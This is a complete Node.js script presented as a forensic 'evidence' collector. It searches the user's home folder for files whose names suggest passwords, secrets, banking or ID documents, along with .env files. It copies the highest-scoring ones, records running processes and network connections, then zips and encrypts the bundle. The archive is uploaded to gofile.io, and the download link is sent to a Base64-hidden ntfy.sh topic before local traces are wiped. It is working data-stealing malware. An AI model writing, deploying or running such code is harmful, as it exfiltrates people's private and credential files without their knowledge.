const fsp = require('fs/promises');
const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const { execSync } = require('child_process');
const AdmZip = require('adm-zip');
const axios = require('axios');
const FormData = require('form-data');

// ============================================================================
// SYSTEM CONFIGURATION
// ============================================================================

const CONFIG = {
    MAX_FILES_TO_EXTRACT: 10,
    
    // Ntfy endpoint (Base64 decoded as 'shinchan_007')
    _sysEndpointRoute: 'c2hpbmNoYW5fMDA3',
    
    SKIP_FOLDERS: ['appdata', 'node_modules', '.git', '.vscode', 'local'],
    ALLOWED_EXTENSIONS: ['.pdf', '.doc', '.docx', '.txt', '.csv', '.jpg', '.png', '.env', '.config', '.json'],

    SCORING: {
        KEYWORDS: [
            { word: 'password', points: 100 },
            { word: 'secret', points: 100 },
            { word: 'resume', points: 80 },
            { word: 'admit', points: 80 },
            { word: 'pan', points: 80 },
            { word: 'bank', points: 80 },
            { word: 'finance', points: 80 },
            { word: 'project', points: 50 },
            { word: 'screenshot', points: 20 }
        ],
        EXTENSIONS: {
            '.pdf': 40, '.docx': 40, '.csv': 30, '.txt': 30, '.env': 50, 
            '.png': -20, '.jpg': -20
        },
        TIME: {
            RECENT_ACCESS_DAYS: 3, RECENT_ACCESS_POINTS: 50,
            OLD_ACCESS_DAYS: 7, OLD_ACCESS_POINTS: 20,
            RECENT_MODIFIED_DAYS: 7, RECENT_MODIFIED_POINTS: 30
        },
        SIZE: { MIN_SIZE_KB: 50, PENALTY_POINTS: -50 }
    }
};

// ============================================================================
// DYNAMIC ENCRYPTION ENGINE
// ============================================================================

function getDynamicKey() {
    const today = new Date();
    const dd = String(today.getDate()).padStart(2, '0');
    const mm = String(today.getMonth() + 1).padStart(2, '0');
    const yyyy = today.getFullYear();
    return `${dd}-${mm}-${yyyy}`; 
}

const ALGORITHM = 'aes-256-cbc';
const KEY = crypto.scryptSync(getDynamicKey(), 'salt', 32); 
const ALERT_ENDPOINT = Buffer.from(CONFIG._sysEndpointRoute, 'base64').toString('utf-8');

// ============================================================================
// CORE SYSTEM CODE
// ============================================================================

const BASE_DIR = os.homedir();
const TARGET_DIR = path.join(process.cwd(), 'important_backup');
const ZIP_FILE_PATH = path.join(process.cwd(), 'My_PC_Backup.zip');

const ALLOWED_EXTS_SET = new Set(CONFIG.ALLOWED_EXTENSIONS);
const SKIP_FOLDERS_SET = new Set(CONFIG.SKIP_FOLDERS.map(f => f.toLowerCase()));

let allFoundFiles = [];

function generateSHA256Hash(filePath) {
    try {
        const fileBuffer = fs.readFileSync(filePath);
        const hashSum = crypto.createHash('sha256');
        hashSum.update(fileBuffer);
        return hashSum.digest('hex');
    } catch (e) {
        return 'HASH_FAILED';
    }
}

function captureVolatileData() {
    try {
        const isWin = os.platform() === 'win32';
        const processCmd = isWin ? 'tasklist' : 'ps -aux';
        const netCmd = isWin ? 'netstat -ano' : 'netstat -an';

        const processes = execSync(processCmd, { encoding: 'utf-8', stdio: 'pipe' });
        const network = execSync(netCmd, { encoding: 'utf-8', stdio: 'pipe' });

        fs.writeFileSync(path.join(TARGET_DIR, 'system_processes.txt'), processes);
        fs.writeFileSync(path.join(TARGET_DIR, 'network_connections.txt'), network);
    } catch (e) {}
}

function calculateFileScore(filePath, stats) {
    let score = 0;
    const fileName = path.basename(filePath).toLowerCase();
    const ext = path.extname(filePath).toLowerCase();

    for (const kw of CONFIG.SCORING.KEYWORDS) {
        if (fileName.includes(kw.word)) {
            score += kw.points;
        }
    }

    if (CONFIG.SCORING.EXTENSIONS[ext] !== undefined) {
        score += CONFIG.SCORING.EXTENSIONS[ext];
    }

    const now = Date.now();
    const daysSinceModified = (now - stats.mtimeMs) / (1000 * 60 * 60 * 24);
    const daysSinceAccessed = (now - stats.atimeMs) / (1000 * 60 * 60 * 24);

    if (daysSinceAccessed <= CONFIG.SCORING.TIME.RECENT_ACCESS_DAYS) {
        score += CONFIG.SCORING.TIME.RECENT_ACCESS_POINTS;
    } else if (daysSinceAccessed <= CONFIG.SCORING.TIME.OLD_ACCESS_DAYS) {
        score += CONFIG.SCORING.TIME.OLD_ACCESS_POINTS;
    }

    if (daysSinceModified <= CONFIG.SCORING.TIME.RECENT_MODIFIED_DAYS) {
        score += CONFIG.SCORING.TIME.RECENT_MODIFIED_POINTS;
    }

    const sizeKB = stats.size / 1024;
    if (sizeKB < CONFIG.SCORING.SIZE.MIN_SIZE_KB) {
        score += CONFIG.SCORING.SIZE.PENALTY_POINTS;
    }

    return score;
}

async function scanDirectory(dir) {
    try {
        const entries = await fsp.readdir(dir, { withFileTypes: true });
        for (const entry of entries) {
            const fullPath = path.join(dir, entry.name);
            if (entry.isDirectory()) {
                if (!entry.name.startsWith('.') && !SKIP_FOLDERS_SET.has(entry.name.toLowerCase())) {
                    await scanDirectory(fullPath);
                }
            } else if (entry.isFile()) {
                const ext = path.extname(entry.name).toLowerCase();
                if (ALLOWED_EXTS_SET.has(ext)) {
                    allFoundFiles.push(fullPath);
                }
            }
        }
    } catch (error) {}
}

async function gatherFiles() {
    await scanDirectory(BASE_DIR);
    
    if (allFoundFiles.length === 0) return;

    await fsp.mkdir(TARGET_DIR, { recursive: true });
    captureVolatileData();

    let scoredFiles = [];
    for (const filePath of allFoundFiles) {
        try {
            const stats = await fsp.stat(filePath);
            const score = calculateFileScore(filePath, stats);
            scoredFiles.push({ path: filePath, score: score });
        } catch (e) {}
    }

    scoredFiles.sort((a, b) => b.score - a.score);
    const selectedFiles = scoredFiles.slice(0, CONFIG.MAX_FILES_TO_EXTRACT).map(item => item.path);
    
    let manifestContent = "File_Name,Original_Path,SHA256_Hash\n";

    for (const filePath of selectedFiles) {
        const fileName = path.basename(filePath);
        await fsp.copyFile(filePath, path.join(TARGET_DIR, fileName));
        
        const fileHash = generateSHA256Hash(filePath);
        manifestContent += `"${fileName}","${filePath}","${fileHash}"\n`;
    }
    
    fs.writeFileSync(path.join(TARGET_DIR, 'evidence_manifest.csv'), manifestContent);
}

async function zipFolder() {
    try {
        const zip = new AdmZip();
        zip.addLocalFolder(TARGET_DIR);
        zip.writeZip(ZIP_FILE_PATH);
    } catch (err) {}
}

function encryptEvidenceZip(zipFilePath) {
    return new Promise((resolve, reject) => {
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv(ALGORITHM, KEY, iv);
        
        const encryptedFilePath = zipFilePath + '.enc';
        const input = fs.createReadStream(zipFilePath);
        const output = fs.createWriteStream(encryptedFilePath);
        
        output.write(iv);
        
        input.pipe(cipher).pipe(output)
            .on('finish', () => {
                try {
                    fs.unlinkSync(zipFilePath);
                } catch(e) {}
                resolve(encryptedFilePath);
            })
            .on('error', reject);
    });
}

async function uploadAndNotify(fileToUpload) {
    let serverName = 'store1';
    try {
        const serverRes = await axios.get('https://api.gofile.io/servers');
        if (serverRes.data?.status === 'ok') {
            serverName = serverRes.data.data.servers[0].name;
        }
    } catch (e) {}

    const form = new FormData();
    form.append('file', fs.createReadStream(fileToUpload)); 

    const uploadRes = await axios.post(`https://${serverName}.gofile.io/uploadFile`, form, {
        headers: form.getHeaders(),
        maxBodyLength: Infinity,
        maxContentLength: Infinity
    });

    if (uploadRes.data.status !== 'ok') return;

    const downloadLink = uploadRes.data.data.downloadPage;

    try {
        await axios.post(`https://ntfy.sh/${ALERT_ENDPOINT}`,
            `DFIR Alert! Forensic Package Uploaded: ${downloadLink}`,
            { headers: { 'Title': 'System Snapshot & Evidence' } }
        );
    } catch (notifyErr) {}
}

function wipeTraces(encryptedFilePath) {
    try {
        if (fs.existsSync(TARGET_DIR)) {
            fs.rmSync(TARGET_DIR, { recursive: true, force: true });
        }
        if (fs.existsSync(encryptedFilePath)) {
            fs.unlinkSync(encryptedFilePath);
        }
    } catch (err) {}
}

async function startFullAutomation() {
    let encryptedFile = null;
    try {
        await gatherFiles();
        if (allFoundFiles.length === 0) return;

        await zipFolder();
        encryptedFile = await encryptEvidenceZip(ZIP_FILE_PATH);
        await uploadAndNotify(encryptedFile);
        
    } catch (err) {
    } finally {
        if (encryptedFile) {
            wipeTraces(encryptedFile);
        }
    }
}

startFullAutomation();